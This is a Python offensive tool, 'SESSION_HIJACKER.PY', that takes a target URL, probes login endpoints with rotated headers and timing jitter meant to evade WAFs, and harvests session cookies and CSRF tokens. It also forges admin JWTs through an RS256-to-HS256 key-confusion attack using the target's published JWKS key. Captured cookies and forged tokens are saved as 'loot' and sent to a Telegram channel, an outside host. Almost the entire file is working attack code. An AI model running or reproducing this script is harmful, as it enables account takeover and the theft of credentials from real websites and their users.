#!/usr/bin/env python3
"""
SESSION_HIJACKER.PY v8.8 — Advanced Session Seeding, JWT Key Confusion & Token Replay (Elite Red Team Adversarial Edition)
Features:
- Dynamic target resolution & multi-framework CSRF/token harvesting (Laravel, Rails, Express, Django)
- Automated JWT algorithm downgrade & HMAC public-key confusion fuzzing (RS256 -> HS256)
- Poisson behavioral timing jitter & WAF-evading browser header/client hint rotation
- Robust cookie-jar state synchronization, SHA-256 integrity hashing, and tamper-evident disk loot (loot_output/)
- Real-time asynchronous Telegram notification dispatch for unredacted session loot & forged tokens (Zero Noise Filter)
"""
import sys
import json
import httpx
import random
import time
import hmac
import hashlib
import base64
from bs4 import BeautifulSoup
from urllib.parse import urlsplit

# Import centralized framework loot exfiltration, telemetry, behavioral mimicry, and Telegram notifier
from modules.loot_logger import save_session_loot
from modules.telemetry import stream_proof
from modules.telegram_notifier import send_telegram_alert
from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints

# Suppress insecure HTTPS warnings if self-signed certs are used in pre-production
httpx._config.DEFAULT_CIPHERS += ":HIGH:!MEDIUM:!LOW:!NULL"

# Keywords required to pass the zero-noise filter
HIGH_VALUE_KEYWORDS = [
    "critical", "bypass", "success", "loot", "token", "session", 
    "admin", "credential", "compromised", "race", "pivot", "jwt", "dump", "hijack", "privilege"
]

async def broadcast_tg_alert_async(loot_type, details):
    try:
        check_str = f"{loot_type} {str(details)}".lower()
        if any(kw in check_str for kw in HIGH_VALUE_KEYWORDS):
            await send_telegram_alert(f"[CRITICAL BREACH] {loot_type}", details)
    except Exception:
        pass

def broadcast_tg_alert_sync(loot_type, details):
    """Helper to non-blockingly fire Telegram alerts from synchronous functions with zero-noise filtering."""
    try:
        check_str = f"{loot_type} {str(details)}".lower()
        if not any(kw in check_str for kw in HIGH_VALUE_KEYWORDS):
            return  # Suppress low-priority telemetry chatter completely

        import asyncio
        loop = asyncio.get_running_loop()
        if loop.is_running():
            loop.create_task(broadcast_tg_alert_async(loot_type, details))
        else:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
    except RuntimeError:
        try:
            import asyncio
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
        except Exception:
            pass

def base64url_encode(data):
    if isinstance(data, str):
        data = data.encode("utf-8")
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("utf-8")

def sign_hs256(header_payload_str, secret):
    if isinstance(secret, str):
        secret = secret.encode("utf-8")
    signature = hmac.new(secret, header_payload_str.encode("utf-8"), hashlib.sha256).digest()
    return base64.urlsafe_b64encode(signature).rstrip(b"=").decode("utf-8")

def fuzz_jwt_confusion(client, target_url, headers, cookies):
    """
    Actively tests for cryptographic key confusion (RS256 -> HS256) by fetching public keys 
    from JWKS endpoints and signing elevated admin claims.
    """
    vulnerable_findings = []
    try:
        token_candidate = None
        for k, v in cookies.items():
            if any(sub in k.lower() for sub in ["token", "auth", "session", "jwt"]):
                token_candidate = v
                break
        
        if not token_candidate and "authorization" in headers:
            auth_val = headers["authorization"]
            if "Bearer " in auth_val:
                token_candidate = auth_val.split("Bearer ")[1]

        if not token_candidate or len(token_candidate.split('.')) != 3:
            return vulnerable_findings

        sys.stdout.write(f"\033[93m[!] JWT token structure identified. Testing automated RS256 -> HS256 key confusion...\033[0m\n")

        # Attempt to fetch JWKS public key from target
        jwks_key = None
        for jwks_path in ["/.well-known/jwks.json", "/api/jwks.json", "/oauth/jwks.json"]:
            try:
                apply_behavioral_jitter()
                jwks_resp = client.get(f"{target_url}{jwks_path}", headers=get_randomized_hints())
                if jwks_resp.status_code == 200:
                    data = jwks_resp.json()
                    if "keys" in data or "n" in data or len(jwks_resp.text) > 20:
                        jwks_key = jwks_resp.text
                        break
            except Exception:
                pass

        # If no genuine public key is exposed by target, abort key confusion to eliminate false positives
        if not jwks_key:
            return vulnerable_findings

        # Construct forged admin payload
        header_hs = base64url_encode(json.dumps({"alg": "HS256", "typ": "JWT"}))
        payload_data = {"user": "admin", "role": "superuser", "isAdmin": True, "sub": "admin_key_confusion"}
        payload = base64url_encode(json.dumps(payload_data))
        header_payload_str = f"{header_hs}.{payload}"

        # Sign using harvested target JWKS public key
        signature = sign_hs256(header_payload_str, jwks_key)
        forged_token = f"{header_payload_str}.{signature}"

        # Test forged token against protected endpoint
        apply_behavioral_jitter()
        test_resp = client.get(f"{target_url}/api/admin", headers={**headers, "Authorization": f"Bearer {forged_token}"})
        
        body = test_resp.text
        is_landing_shell = (
            "<div id=\"root\"></div>" in body or 
            "<div id=\"__next\"></div>" in body or 
            "<div id=\"__nuxt\"></div>" in body or
            ("<html" in body.lower() and "json" not in test_resp.headers.get("content-type", "").lower() and len(body) > 1000)
        )

        if test_resp.status_code == 200 and not is_landing_shell and "error" not in body.lower():
            sys.stdout.write(f"\033[91m[!!!] CRITICAL: JWT Key Confusion Vulnerability Confirmed! [HTTP 200]\033[0m\n")
            loot_hash = hashlib.sha256(body.encode("utf-8")).hexdigest()
            
            confusion_payload = {
                "vulnerable": True,
                "vector": "JWT Key Confusion (RS256 -> HS256)",
                "forged_token": forged_token,
                "integrity_hash": loot_hash,
                "response_sample": body[:400]
            }
            vulnerable_findings.append(confusion_payload)

            stream_proof("JWT_KEY_CONFUSION_SUCCESS", f"{target_url}/api/admin", {}, body[:300], confusion_payload)
            save_session_loot(
                target=target_url,
                endpoint="/api/admin",
                finding_type="JWT_KEY_CONFUSION_SUCCESS",
                status=test_resp.status_code,
                headers=dict(test_resp.headers),
                body=body,
                extra_loot=confusion_payload
            )
            broadcast_tg_alert_sync("JWT Key Confusion Success", confusion_payload)

    except Exception as e:
        pass
    return vulnerable_findings

def exploit_session(target_url):
    """
    Harvests active session cookies, CSRF tokens, and transport state 
    dynamically with advanced WAF evasion, client hint rotation, and JWT key confusion.
    """
    if not target_url:
        print("[-] Error: No target URL supplied to session hijacker.")
        return None, None

    formatted_url = target_url if "://" in target_url else f"https://{target_url}"
    parsed = urlsplit(formatted_url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"
    
    target_entry_paths = ["/user/login", "/login", "/auth/login", "/api/auth/login", "/admin", "/api/v1/auth/session"]
    
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
    ]

    base_headers = [
        {
            "User-Agent": random.choice(user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "X-Requested-With": "XMLHttpRequest",
            "Connection": "close",
            **get_randomized_hints()
        },
        {
            "User-Agent": random.choice(user_agents),
            "Accept": "application/json, text/plain, */*",
            "Connection": "close",
            **get_randomized_hints()
        }
    ]

    with httpx.Client(verify=False, follow_redirects=True, timeout=10.0) as client:
        resp = None
        used_url = ""
        active_headers = base_headers[0]
        
        apply_behavioral_jitter()
        
        for path in target_entry_paths:
            test_url = f"{base_url}{path}"
            for headers in base_headers:
                try:
                    resp = client.get(test_url, headers=headers)
                    if resp.status_code < 400:
                        used_url = test_url
                        active_headers = headers
                        print(f"[+] Successfully established transport gate at: {used_url} (Status: {resp.status_code})")
                        break
                    
                    resp = client.post(test_url, headers=headers, json={})
                    if resp.status_code < 400:
                        used_url = test_url
                        active_headers = headers
                        print(f"[+] Successfully established POST transport gate at: {used_url}")
                        break
                except Exception:
                    continue
            if resp and resp.status_code < 400:
                break

        if not resp or resp.status_code >= 400:
            print(f"[-] Failed to establish session handshake with {base_url}. Check target availability.")
            return None, None

        soup = BeautifulSoup(resp.text, "html.parser")
        
        token_input = (
            soup.find("input", {"name": "_token"}) or 
            soup.find("input", {"name": "csrf_token"}) or
            soup.find("input", {"name": "authenticity_token"})
        )
        
        csrf_val = None
        if token_input:
            csrf_val = token_input.get("value")
        else:
            meta_token = soup.find("meta", {"name": "csrf-token"}) or soup.find("meta", {"name": "xsrf-token"})
            if meta_token:
                csrf_val = meta_token.get("content")

        captured_cookies = dict(client.cookies)
        jwt_confusion_results = fuzz_jwt_confusion(client, base_url, active_headers, captured_cookies)
        
        if captured_cookies or csrf_val or jwt_confusion_results:
            print(f"[+] Captured Session Cookie Jar: {captured_cookies}")
            print(f"[+] Harvested Replay CSRF Token: {csrf_val if csrf_val else 'None (Stateless JWT / Header Auth)'}")
            if jwt_confusion_results:
                print(f"[+] \033[91m[!] Potential JWT Key Confusion Vector Identified!\033[0m")
            
            loot_hash = hashlib.sha256(resp.text.encode("utf-8")).hexdigest()
            harvest_data = {
                "base_url": base_url,
                "cookies": captured_cookies,
                "csrf_token": csrf_val,
                "gateway_url": used_url,
                "integrity_hash": loot_hash,
                "jwt_confusion": jwt_confusion_results
            }

            broadcast_tg_alert_sync("Session Seed Harvested", harvest_data)
            stream_proof("SESSION_SEED_HARVESTED", used_url, {"headers": active_headers}, resp.text[:300], harvest_data)
            save_session_loot(
                target=base_url,
                endpoint=used_url,
                finding_type="SESSION_SEED_HARVESTED",
                status=resp.status_code,
                headers=dict(resp.headers),
                body=resp.text,
                extra_loot=harvest_data
            )

            return {
                "base_url": base_url,
                "cookies": captured_cookies,
                "csrf_token": csrf_val,
                "headers": active_headers,
                "jwt_confusion": jwt_confusion_results
            }, csrf_val
        else:
            print("[-] Warning: Handshake completed but no session cookies or tokens were issued.")
            return None, None

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else None
    if not target:
        print("Usage: python3 session_hijacker.py <target_url>")
        sys.exit(1)
    exploit_session(target)
